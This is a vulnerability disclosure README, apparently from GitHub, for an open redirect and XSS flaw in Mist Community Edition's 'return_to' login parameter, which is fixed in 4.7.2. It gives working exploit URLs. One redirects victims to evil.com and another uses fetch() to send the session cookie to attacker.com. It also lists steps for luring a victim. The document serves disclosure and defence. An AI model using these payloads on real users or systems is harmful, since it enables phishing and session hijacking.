# Open Redirect Leading to XSS and Malicious Site Redirects

<table>
  <tr>
    <td width="150" rowspan="2">
      <a href="https://github.com/mistio/mist-ce" target="_blank">
        <img src="https://avatars.githubusercontent.com/u/1569127?s=200&v=4" alt="Summer Pearl Logo" width="120"/>
      </a>
    </td>
    <td>
      <h1>Mist Community Edition</h1>
      <h3> An Open-Source Multicloud Management Platform</h3>
    </td>
  </tr>
  <tr>
    <td>
      <table>
        <tr>
          <td>
            🔗 <a href="https://github.com/mistio/mist-ce" target="_blank">Mist Github Repository</span></a>
          </td>
          <td style="padding-left: 15px;">
            🚀 <a href="https://github.com/mistio/mist-ce/releases/tag/v4.7.2" target="_blank"> Patched Version (v4.7.2) </span></a>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>


## 📜 Description
Mist Community Edition (CE) versions prior to 4.7.2 fail to properly validate the "return_to" parameter in the authentication system, creating a combined open redirect and reflected cross-site scripting (XSS) vulnerability. An attacker can craft malicious login URLs that, when clicked by a victim, either redirect to arbitrary external domains or execute attacker-controlled JavaScript in the context of the Mist CE application. This vulnerability requires user interaction but can lead to credential phishing, session hijacking, or other client-side attacks depending on the payload delivered through the crafted URL.

## 🔍 Affected Versions

| Status       | Version         |
|--------------|-----------------|
| 🔴 Vulnerable |  ≤ `4.7.1`      |
| 🟢  Fixed     |  &nbsp;&nbsp;`4.7.2`      |   

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## 💻 Exploit Details

### 🔹 **Exploiting Open Redirect for Phishing or Malicious Site Redirects**
By crafting a malicious login URL, an attacker can trick users into authenticating on Mist and then redirect them to an external phishing site designed to steal credentials. The following example demonstrates such an attack:

```
http://example.com/sign-in?return_to=http://evil.com
```

After login, the victim is redirected to `http://evil.com`, where an attacker may host a fake Mist login page to harvest credentials.

### 🔹 **Exploiting Open Redirect for XSS**
The vulnerability also allows for direct **JavaScript execution** via the `return_to` parameter, leading to stored XSS attacks. An attacker can craft a URL that executes arbitrary JavaScript in the victim’s browser:

```
http://example.com/sign-in?return_to=javascript:alert(document.cookie);
```

Upon authentication, this payload triggers an alert displaying the victim’s session cookie.
## 🛠️ Steps to Reproduce

### 1️⃣ Open Redirect Exploit
1. Navigate to Mist’s login page and intercept the request.
2. Modify the `return_to` parameter to point to a malicious site (`http://evil.com`).
3. Send the crafted URL to a victim and persuade them to log in.
4. Upon authentication, they are redirected to the attacker's website.

### 2️⃣ XSS Exploit via Open Redirect
1. Craft a malicious login URL using a JavaScript payload:
   ```
   http://example.com/sign-in?return_to=javascript:fetch('http://attacker.com/cookie/'+document.cookie);
   ```
2. Send the URL to a victim.
3. Upon login, their session cookie is sent to the attacker’s C2 server (`http://attacker.com`).

## 🎬 Demonstration Video

<a href="https://www.youtube.com/watch?v=GLZ9JikmWVE" target="_blank">
  <img src="https://img.youtube.com/vi/GLZ9JikmWVE/maxresdefault.jpg"/>
</a>

## 🧑‍💻 Discovery

This vulnerability was discovered by **Alex Perrakis** (Stolichnayer).

## 🔗 References:
- [Mist CE Github Repository](https://github.com/mistio/mist-ce)
- [Patched Version (v4.7.2)](https://github.com/mistio/mist-ce/releases/tag/v4.7.2)
- [Fix Commit](https://github.com/mistio/mist.api/commit/db10ecb62ac832c1ed4924556d167efb9bc07fad)

